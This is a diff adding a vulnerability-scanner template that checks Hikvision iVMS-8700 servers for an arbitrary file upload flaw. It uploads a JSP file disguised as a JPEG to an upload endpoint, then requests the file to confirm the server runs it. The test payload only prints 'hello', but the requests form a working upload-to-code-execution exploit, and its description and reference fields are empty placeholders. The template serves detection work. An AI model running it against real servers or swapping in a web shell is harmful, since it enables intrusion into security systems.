@@ -1,0 +1,68 @@
+id: Hikvision_17
+
+info:
+  name: 海康威视iVMS-8700综合安防系统resourceOperations任意文件上传
+  author: YanXi
+  severity: high
+  description: description
+  reference:
+    - https://
+  tags: Hikvision
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |-
+        POST /eps/resourceOperations/upload.action HTTP/1.1
+        Host: {{Hostname}}
+        Cache-Control: max-age=0
+        Upgrade-Insecure-Requests: 1
+        User-Agent: MicroMessenger
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: ISMS_8700_Sessionname=CA0F207A6372FE883ACA78B74E6DC953; CAS-USERNAME=058; ISMS_8700_Sessionname=4D808BE7BE0E5C7047B9688E6009F710
+        Connection: close
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTJyhtTNqdMNLZLhj
+        Content-Length: 212
+
+        ------WebKitFormBoundaryTJyhtTNqdMNLZLhj
+        Content-Disposition: form-data; name="fileUploader";filename="test.jsp"
+        Content-Type: image/jpeg
+
+        <%out.print("hello");%>
+        ------WebKitFormBoundaryTJyhtTNqdMNLZLhj--
+        
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'true'
+        internal: true
+        
+    extractors:
+      - type: regex
+        name: resourceUuid
+        part: body
+        internal: true 
+        regex:
+          - '([^"]{32})'
+
+  - raw:
+      - |+
+        GET /eps/upload/{{resourceUuid}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Cache-Control: max-age=0
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+        
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'hello'
